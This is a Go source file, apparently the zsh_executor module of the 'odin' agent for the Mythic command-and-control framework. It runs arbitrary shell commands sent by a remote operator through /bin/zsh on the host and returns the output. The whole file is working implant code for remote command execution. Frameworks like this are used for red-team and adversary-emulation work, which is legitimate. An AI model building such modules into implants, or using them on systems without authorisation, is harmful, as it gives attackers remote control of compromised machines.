package zsh_executor

import (
	// Standard
	"bytes"
	"os"
	"os/exec"
	"strings"

	// Odin

	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/pkg/utils/structs"
)

//Run - Function that executes the zsh_executor command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	zshBin := "/bin/zsh"
	if _, err := os.Stat(zshBin); err != nil {
			msg.SetError("Could not find /bin/zsh")
			task.Job.SendResponses <- msg
			return
	}

	cmd := exec.Command(zshBin)
	cmd.Stdin = strings.NewReader(task.Params)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	var outputString string
	if out.String() == "" {
		outputString = "Command processed (no output)."
	} else {
		outputString = out.String()
	}
	msg.UserOutput = outputString
	msg.Completed = true
	if err != nil {
		msg.Status = "error"
		msg.UserOutput += "\n" + err.Error()
	}
	task.Job.SendResponses <- msg
	return
}
